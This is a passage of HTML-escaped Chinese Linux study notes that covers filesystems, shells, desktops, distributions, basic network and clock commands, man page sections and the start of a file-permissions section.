
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;msdos&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;微软的FAT16&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ncp&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Netware文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;nfs&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;网络文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ntfs&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;支持Microsoft NT文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;proc&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;访问系统信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ReiserFS&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;高级Linux文件系统，能提供更好的性能和硬盘恢复功能&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;smb&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;支持网络访问的Samba SMB文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;sysv&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;较早期的Unix文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ufs&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;BSD文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;umsdos&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;建立在msdos上的类Unix文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;vfat&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Windows95文件系统（FAT32）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;XFS&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;高性能64位日志文件系统&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
Linux 内核采用虚拟文件系统（Virtual File System,VFS）作为和每个文件系统交互的接口。     
&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;
&lt;b&gt;GNU工具&lt;/b&gt;
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;核心 GNU 工具：coreutils(coreutilities)软件包
GNU coreutils 软件包由三部分构成：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;用以处理文件的工具&lt;/li&gt;
&lt;li&gt;用以操作文本的工具&lt;/li&gt;
&lt;li&gt;用以管理进程的工具&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
shell
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 3:&lt;/span&gt; Linux 中常见的shell&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;shell&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;bash&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;bash shell 是 Bourne shell 的一个免费版本，它是最早的 Unix shell，bash还有一个特点，可以通过help命令来查看帮助。包含的功能几乎可以涵盖shell所具有的功能，所以一般的shell脚本都会指定它为执行路径。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ash&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一种运行在内存受限环境中简单的轻量级shell，但与bash shell完全兼容。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;korn&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一种与 Bourne shell，但支持如关联数组和浮点运算等一些高级的编程特性。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;tcsh&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一种将C语言中的一些元素引入到shell脚本中的shell。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;zsh&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一种结合了bash、tcsh和korn的特性，同时提供高级编程特性、共享历史文件和主题化提示符的高级shell。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;
&lt;b&gt;Linux 桌面环境&lt;/b&gt;
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;X Window&lt;/li&gt;
&lt;li&gt;KDE 桌面（K Desktop Environment，K 桌面系统）&lt;/li&gt;
&lt;li&gt;GNOME 桌面（the GNU Network Object Model Environment，GNU 网络对象模型桌面）&lt;/li&gt;
&lt;li&gt;Unity 桌面&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
其他桌面
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 4:&lt;/span&gt; 其他桌面&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;桌面&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Fluxbox&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Xfce&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;JWM&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Fvwm&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;fvwm95&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;
&lt;b&gt;Linux 发行版&lt;/b&gt;
&lt;br /&gt;
不同的 Linux 发行版通常归类为3种：
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
完整的核心 Linux 发行版
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 5:&lt;/span&gt; 完整的核心 Linux 发行版&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Slackware&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;最早的 Linux 发行版之一&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Red Hat&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;商业发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Fedora&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Red Hat 分离出的家用发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Gentoo&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;为高级 Linux 用户设计的发行版，仅包含 Linux 源代码&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;openSuse&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;商用和家用的发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Debian&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Linux 专家和商用 Linux 产品中流行的发行版&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
特定用途的发行版
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 6:&lt;/span&gt; 特定用途的发行版&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;CentOS&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款基于 Red Hat 企业版 Linux 源代码构建的免费发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Ubuntu&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款用于学校和家庭的免费发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;PCLinuxOS&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款用于学校和办公的免费发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Mint&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款用于家庭娱乐的免费发行版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;dyne:bolic&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款用于音频和MIDI应用的免费发型版&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Puppy Linux&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款适用于老旧PC的小型免费发行版&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
LiveCD 测试发行版。
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 7:&lt;/span&gt; LiveCD 测试发行版。&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Knoppix&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;最早的 LiveCD Linux&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;PCLinuxOS&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一款成熟的 LiveCD&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Ubuntu&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;为多种语言设计的世界级 Linux 项目&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Slax&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;基于 Slackware Linux&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Pubby Linux&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;为老旧 PC 设计的一款全功能 Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org24f45b2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org24f45b2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.3&lt;/span&gt; Linux 基本网络配置&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装网络工具
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install net-tools

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;配置网络
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;在 Linux 中，以太网接口被命名为：eth0、eth1等。&lt;/li&gt;
&lt;li&gt;lspci 命令可以查看网卡硬件信息（如果是 usb 网卡，则需要使用 lsusb 命令）&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
ifconfig 命令：查看接口信息
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ifconfig -a
$ ifconfig eth0

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
ifup,ifdown 命令：启用、禁用一个接口
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ifup eth0
$ ifdown eth0

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;相关配置文件
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;网卡配置文件：/etc/sysconfig/network-scripts/ifcfg-eth0&lt;/li&gt;
&lt;li&gt;DNS 配置文件：/etc/resolv.conf&lt;/li&gt;
&lt;li&gt;主机名配置文件：/etc/sysconfig/network&lt;/li&gt;
&lt;li&gt;静态主机名配置文件：/etc/hosts&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;网络测试
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;测试网路连通性：ping 命令&lt;/li&gt;
&lt;li&gt;测试DNS解析：host,dig 命令&lt;/li&gt;
&lt;li&gt;显示路由表：ip route 命令&lt;/li&gt;
&lt;li&gt;追踪到达目标地址的网络路径：traceroute 命令&lt;/li&gt;
&lt;li&gt;mtr 命令进行网络质量测试&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8d8a5c8&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8d8a5c8&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.4&lt;/span&gt; Linux 日期时间设置&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-4&quot;&gt;
&lt;p&gt;
Linux 时钟分为系统时钟（System Clock）和硬件时钟（Real Time Clock，简称 RTC）。系统时钟指当前 Linux Kernel 中的时钟;硬件时钟指主板上由电池供电的时钟，可在 BIOS 中进行设置。
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;date 命令&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
hwclock 命令，查看硬件时间
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
//设置硬件时间
$ sudo hwclock -set -date='07/17/2017 20:00'

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
硬件时间与系统时钟同步
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo hwclock --hctosys(hc 代表硬件时间，sys 代表系统时间)
$ sudo hwclock -systohc

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgffc02b2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgffc02b2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.5&lt;/span&gt; 获取帮助 &amp;amp; 问题解决&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;出现问题，先保护现场。（问题一种是已正确运行的系统出问题，另一种是新的操作或配置造成了问题）&lt;/li&gt;
&lt;li&gt;当怀疑有黑客入侵或病毒的情况，马上做日志备份。&lt;/li&gt;
&lt;li&gt;检查相关日志。&lt;/li&gt;
&lt;li&gt;对于新的操作或配置造成的问题，最好是养成定期备份重要文件的习惯。&lt;/li&gt;
&lt;li&gt;使用网络&lt;/li&gt;
&lt;li&gt;使用搜索命令：find，locate，whereis。。。&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
man
查看在线帮助手册(an interface to the on-line reference manuals)，如果不记得命令名怎么办？可以使用关键字搜索手册页。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ man -k terminal

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 8:&lt;/span&gt; Linux 手册页惯用的节名&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;节&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Name&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示命令和一段简短的描述&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Synopsis&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令的语法&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Configuration&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令配置信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Description&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令的一般性描述&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Options&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令选项描述&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Exit Status&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令的推出状态指示&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Return Value&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令的返回值&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Errors&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令的错误信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Environment&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;描述所使用的环境变量&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Files&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令用到的文件&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Versions&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令的版本信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Conforming To&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令所遵从的标准&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Notes&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;其他有帮助的资料&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Bugs&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;提供提交Bug的途径&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Example&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;展示命令的用法&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Authors&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令开发人员的信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Copyright&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令源代码的版权状况&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;See Also&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;与该命令类似的其他命令&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 9:&lt;/span&gt; Linux 手册页的内容区域&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;区域号&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;所涵盖的内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;可执行程序或shell命令&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;系统调用&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;3&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;库调用&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;4&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;特殊文件&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;5&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;文件格式与约定&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;6&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;游戏&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;7&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;概览、约定及杂项&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;8&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;超级用户和系统管理员命令&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;9&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;内核例程&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;help
&lt;br /&gt;
查看命令帮助信息(Display information about builtin commands.)&lt;/li&gt;
&lt;li&gt;type
&lt;br /&gt;
查看命令类型(Display information about command type)&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgff45995&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgff45995&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; Linux File, Directory, and Disk format&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbf0032b&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgbf0032b&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; Linux File Permission&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2f59879&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org2f59879&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.1.1&lt;/span&gt; 理解文件权限&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
使用文件权限符
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ls -lh

&lt;/pre&gt;
&lt;p&gt;
drwxr-xr-x 3 zrg zrg 4.0K Apr 21 16:24 练手项目
-rw-r&amp;#x2013;r&amp;#x2013; 1 zrg zrg 2.5M Apr 21 11:51 练手项目.rar
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 10:&lt;/span&gt; 解释&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;d&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;rwxr-xr-x&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;3&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;zrg&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;zrg&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;4.0K&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;Apr 21 16:24&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;练手项目&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;文件类型。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;文件权限。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;对于普通文件：链接数&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;用户名&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;组名&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;文件大小，单位：字节&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;最后修改日期时间&lt;/td&gt;
